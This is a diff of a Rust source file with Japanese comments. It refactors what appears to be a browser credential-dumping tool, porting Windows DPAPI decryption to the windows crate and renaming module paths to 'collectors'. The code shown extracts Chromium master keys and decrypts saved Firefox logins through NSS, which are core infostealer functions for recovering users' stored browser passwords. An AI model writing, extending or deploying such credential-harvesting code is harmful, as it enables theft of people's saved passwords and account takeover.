@@ -34,13 +34,10 @@ use std::path::{Path, PathBuf};
 use std::sync::Mutex;
 use tempfile::NamedTempFile;
 use walkdir::WalkDir;
-use winapi::um::dpapi::CryptUnprotectData;
-use winapi::um::winbase::LocalFree;
-use winapi::um::wincrypt::DATA_BLOB;
 
 // Firefox NSS復号化機能のインポート（一時無効）
 // use crate::credentials::NssCredentials;
-use crate::browser_profiles::get_default_profile;
+use crate::collectors::browser_profiles::get_default_profile;
 
 // ===============================================================================
 // エラー型定義
@@ -385,44 +382,63 @@ pub fn get_master_key<P: AsRef<Path>>(local_state_path: P) -> ChromiumResult<Opt
     Ok(Some(master_key))
 }
 
-/// DPAPIを使用してデータを復号化
+/// DPAPIを使用してデータを復号化 (Windows crateを使用)
 fn decrypt_with_dpapi(encrypted_data: &[u8]) -> ChromiumResult<Vec<u8>> {
     if encrypted_data.is_empty() {
         return Ok(Vec::new());
     }
     
-    unsafe {
-        let mut data_in = DATA_BLOB {
-            cbData: encrypted_data.len() as u32,
-            pbData: encrypted_data.as_ptr() as *mut u8,
+    #[cfg(windows)]
+    {
+        use windows::Win32::Security::Cryptography::{
+            CryptUnprotectData, CRYPT_INTEGER_BLOB,
         };
+        
+        use windows::Win32::Foundation::{HLOCAL, LocalFree};
+        
+        unsafe {
+            let mut data_in = CRYPT_INTEGER_BLOB {
+                cbData: encrypted_data.len() as u32,
+                pbData: encrypted_data.as_ptr() as *mut u8,
+            };
 
-        let mut data_out = DATA_BLOB {
-            cbData: 0,
-            pbData: std::ptr::null_mut(),
-        };
+            let mut data_out = CRYPT_INTEGER_BLOB {
+                cbData: 0,
+                pbData: std::ptr::null_mut(),
+            };
 
-        let result = CryptUnprotectData(
-            &mut data_in,
-            std::ptr::null_mut(),
-            std::ptr::null_mut(),
-            std::ptr::null_mut(),
-            std::ptr::null_mut(),
-            0,
-            &mut data_out,
-        );
+            let result = CryptUnprotectData(
+                &mut data_in,
+                None,
+                None,
+                None,
+                None,
+                0,
+                &mut data_out,
+            );
 
-        if result == 0 {
-            return Err(ChromiumDumpError::Dpapi("DPAPI decryption failed".to_string()));
+            if result.is_err() {
+                return Err(ChromiumDumpError::Dpapi("DPAPI decryption failed".to_string()));
+            }
+
+            // データをコピー
+            let decrypted_data = std::slice::from_raw_parts(
+                data_out.pbData, 
+                data_out.cbData as usize
+            ).to_vec();
+
+            // メモリを解放（直接システムコールを使用）
+            if !data_out.pbData.is_null() {
+                LocalFree(Some(HLOCAL(data_out.pbData as *mut _ as _)));
+            }
+
+            Ok(decrypted_data)
         }
-
-        // データをコピー
-        let decrypted_data = std::slice::from_raw_parts(data_out.pbData, data_out.cbData as usize).to_vec();
-
-        // メモリを解放
-        LocalFree(data_out.pbData as *mut _);
-
-        Ok(decrypted_data)
+    }
+    
+    #[cfg(not(windows))]
+    {
+        Err(ChromiumDumpError::Dpapi("DPAPI is only available on Windows".to_string()))
     }
 }
 
@@ -808,7 +824,7 @@ fn safe_nss_decrypt_logins(
 }
 
 /// NSS初期化を安全に実行
-fn initialize_nss_safely(profile_path: &Path) -> Result<crate::firefox_nss::Nss, Box<dyn std::error::Error>> {
+fn initialize_nss_safely(profile_path: &Path) -> Result<crate::collectors::firefox_nss::Nss, Box<dyn std::error::Error>> {
     let _ = ();
     
     // NSS依存関係の事前チェック
@@ -830,7 +846,7 @@ fn initialize_nss_safely(profile_path: &Path) -> Result<crate::firefox_nss::Nss,
     }
     
     // NSS 初期化を試行
-    let nss = crate::firefox_nss::Nss::new()
+    let nss = crate::collectors::firefox_nss::Nss::new()
         .map_err(|e| format!("Failed to load NSS library: {}", e))?;
     
     nss.initialize(profile_path)
@@ -841,7 +857,7 @@ fn initialize_nss_safely(profile_path: &Path) -> Result<crate::firefox_nss::Nss,
 
 /// 個別のFirefoxログインエントリを復号化
 fn decrypt_firefox_login(
-    nss: &crate::firefox_nss::Nss,
+    nss: &crate::collectors::firefox_nss::Nss,
     login: &serde_json::Value
 ) -> Result<Option<LoginEntry>, Box<dyn std::error::Error>> {
     let hostname = login.get("hostname")
